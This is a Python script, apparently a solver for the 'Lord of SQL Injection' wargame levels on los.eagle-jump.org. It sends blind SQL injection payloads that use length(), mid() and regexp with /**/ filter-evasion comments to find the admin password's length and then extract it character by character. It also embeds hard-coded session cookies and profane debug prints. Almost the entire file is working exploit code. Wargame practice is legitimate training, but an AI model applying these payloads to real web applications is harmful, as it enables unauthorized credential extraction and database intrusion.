import requests
from bs4 import BeautifulSoup



request_header = {
	"Accept": "*/*",
	'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac Os X 10_9_5) AppleWebKit 537.36 (KHMTL, like Gecko) Chrome',
	'Accept-Language': 'ko-KR,ko;q=0.8,en-US;q=0.6,en;q=0.4'
}
target_url = "https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php"
query = "?pw=1%27or%20length(pw)%20=%20%27{}"
s =  requests.session()
cookies = {"__cfduid":"dea80bf0edb4998f73e2bfa300ad2205c1555395056","PHPSESSID":"rovn0in7cju804dkbussm1g771"}

target_url="https://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php"
query = "?pw=1234&no=1234||length(pw)/**/regexp/**/{}"
print(target_url+query)
length =0 
for i in range(1,30):
	print(target_url+query.format(i))
	html = s.get(target_url+query.format(i),headers=request_header,cookies=cookies)
	bs_obj = BeautifulSoup(html.text,'html.parser')
	if 'Hello admin' in bs_obj.text:
		length= i
		break

print("length :", length)
# https://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1234&no=1234%20%20||ord(mid(pw,1,1))%20%20like%208
attack_query = "?pw=1234&no=1234||mid(pw,{},1)/**/regexp/**/{}"
word_list = []
for i in range(1,length+1):
	print("%d 번째" % i)

	for j in range(0,123):
		print(target_url+attack_query.format(i,bin(j)))
		html = s.get(target_url+attack_query.format(i,bin(j)),headers=request_header,cookies=cookies)
		bs_obj = BeautifulSoup(html.text,'html.parser')

		if 'Hello admin' in bs_obj.text:
			print('sibasbisbsi')
			word_list.append(chr(j))
			break
	else:
		print('sibal')
print(word_list)
print(''.join(word_list))